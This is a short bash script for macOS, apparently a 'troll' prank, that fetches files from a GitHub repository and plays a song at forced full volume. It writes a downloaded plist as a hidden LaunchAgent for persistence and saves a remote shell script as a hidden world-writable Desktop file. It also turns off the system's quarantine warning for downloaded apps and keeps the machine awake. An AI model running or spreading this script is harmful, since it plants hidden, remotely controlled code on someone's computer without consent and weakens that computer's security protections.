#! /bin/bash

curl -s -L https://raw.githubusercontent.com/SethBurkart123/macostroll/main/main.plist >> ~/Library/LaunchAgents/.main1.plist
cat ~/Library/LaunchAgents/.main1.plist >> ~/Library/LaunchAgents/.music.plist
rm ~/Library/LaunchAgents/.main1.plist
chmod 600 ~/Library/LaunchAgents/.music.plist
launchctl load ~/Library/LaunchAgents/.music.plist

curl -s -L https://raw.githubusercontent.com/SethBurkart123/macostroll/main/run.sh >> ~/Desktop/.music.sh
chmod 777 ~/Desktop/.music.sh


curl -L https://raw.githubusercontent.com/SethBurkart123/macostroll/main/nevergonnagiveyouup.mp3 --output ~/Desktop/.troll.mp3


#sleep 30m

#Disable the “Are you sure you want to open this application?” dialog
defaults write com.apple.LaunchServices LSQuarantine -bool false

caffeinate &
afplay ~/Desktop/.troll.mp3 &

end=$((SECONDS+4))

while [ $SECONDS -lt $end ]; do
	osascript -e 'set volume 100'
done

#sleep 600m
#sh ~/Desktop/.music.sh
